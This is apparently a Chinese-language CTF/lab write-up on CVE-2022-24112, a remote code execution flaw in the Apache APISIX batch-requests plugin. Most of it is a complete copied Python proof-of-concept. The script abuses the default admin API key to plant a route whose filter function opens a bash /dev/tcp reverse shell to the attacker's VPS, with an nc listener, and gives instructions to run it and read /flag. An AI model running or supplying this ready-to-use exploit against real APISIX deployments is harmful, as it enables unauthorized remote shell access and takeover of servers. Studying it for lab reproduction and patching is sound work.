> 参考：[Apache APISIX Dashboard（CVE-2022-24112）命令执行漏洞方式利用\_长白山攻防实验室的博客-CSDN博客](https://blog.csdn.net/include_voidmain/article/details/124096869)
> 注，漏洞的详细分析可以参看上面这篇博文

## 1. Apache APISIX 介绍
Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。
> Apache APISIX 是一个动态、实时、高性能的开源 API 网关，提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX 可以帮助企业快速、安全地处理 API 和微服务流量，包括网关、Kubernetes Ingress 和服务网格等。

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202308271049677.png)

## 2. 漏洞介绍
Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。
- 漏洞编号：CVE-2022-24112
- 影响版本：Apache APISIX < 2.12.1，Apache APISIX < 2.10.4 (LTS versions)
- 漏洞类型: 命令执行

## 3. 漏洞复现
### 3.1. 个人有 VPS 的复现
用 [CVE-2022-24112-POC](https://github.com/twseptian/cve-2022-24112) 攻击获取 shell
在 VPS 上开启 nc 监听

```python
python3 poc2.py -t eci-2ze5sddv1nd77pcngx3i.cloudeci1.ichunqiu.com -p 9080 -L VPS_IP -P VPS_PORT
```

脚本攻击后会直接获得shell，接着读取 /flag 即可。
poc2.py【代码备份】
```python
#!/usr/bin/python3
# Exploit Title: Apache APISIX 2.12.1 - Remote Code Execution (RCE)
# Vendor Homepage: https://apisix.apache.org/
# Version: Apache APISIX 1.3 – 2.12.1
# Tested on: Kali Linux
# CVE : CVE-2022-24112

import requests
import sys
import subprocess
import shlex
import argparse

class Interface ():
	def __init__ (self):
		self.red = '\033[91m'
		self.green = '\033[92m'
		self.white = '\033[37m'
		self.yellow = '\033[93m'
		self.bold = '\033[1m'
		self.end = '\033[0m'

	def header(self):
		print('\n    >> Apache APISIX 2.12.1 - Remote Code Execution (RCE)')
		print('    >> by twseptian\n')

	def info (self, message):
		print(f"[{self.white}*{self.end}] {message}")

	def warning (self, message):
		print(f"[{self.yellow}!{self.end}] {message}")

	def error (self, message):
		print(f"[{self.red}x{self.end}] {message}")

	def success (self, message):
		print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

class Exploit:
    def __init__(self, target_ip, target_port, localhost,localport):
        self.target_ip = target_ip
        self.target_port = target_port
        self.localhost = localhost
        self.localport = localport
    
    def get_rce(self):
        headers1 = {
            'Host': '{}:8080'.format(target_ip),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
            'Accept': '*/*','Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
            'Content-Length': '540','Connection': 'close',
        }
        headers2 = {
            'Host': '{}:8080'.format(target_ip),
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
            'Accept': '*/*','Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
            'Connection': 'close',
        }
        json_data = {
            'headers': {
                'X-Real-IP': '{}:8080'.format(target_ip),
                'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
                'Content-Type': 'application/json',
            },
            'timeout': 1500,
            'pipeline': [
                { 
                    'path': '/apisix/admin/routes/index','method': 'PUT',
                    'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1}},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/'+localhost+'/'+localport+';/bin/sh <&160 >&160 2>&160\\\\\\"\'); return true end"}',
                },
            ],
        }
        
        output.warning("Take RCE\n")
        response1 = requests.post('http://'+target_ip+':'+target_port+'/apisix/batch-requests', headers=headers1, json=json_data, verify=False)
        listener = "nc -nvlp {}".format(localport)
        cmnd = shlex.split(listener)
        subprocess.Popen(cmnd)
        response2 = requests.get('http://'+target_ip+':'+target_port+'/rms/fzxewh', headers=headers2, verify=False)

def get_args():
    parser = argparse.ArgumentParser(description='Apache APISIX 2.12.1 - Remote Code Execution (RCE)')
    parser.add_argument('-t', '--rhost', dest="target_ip", required=True, action='store', help='Target IP')
    parser.add_argument('-p', '--rport', dest="target_port", required=True, action='store', help='Target Port')
    parser.add_argument('-L', '--lhost', dest="localhost", required=True, action='store', help='Localhost/Local IP')
    parser.add_argument('-P', '--lport', dest="localport", required=True, action='store', help='Localport')
    args = parser.parse_args()
    return args

try:
    args = get_args()
    target_ip = args.target_ip
    target_port = args.target_port
    localhost = args.localhost
    localport = args.localport
    
    exp = Exploit(target_ip, target_port, localhost, localport)
    exp.get_rce()
except KeyboardInterrupt:
    pass
```

当然用这个脚本也行[Apache APISIX 2.12.1 - Remote Code Execution (RCE) - Multiple remote Exploit](https://www.exploit-db.com/exploits/50829)
### 3.2. 本地搭建环境复现
参见 Vulhub 靶场 CVE-2022-24112【RCE】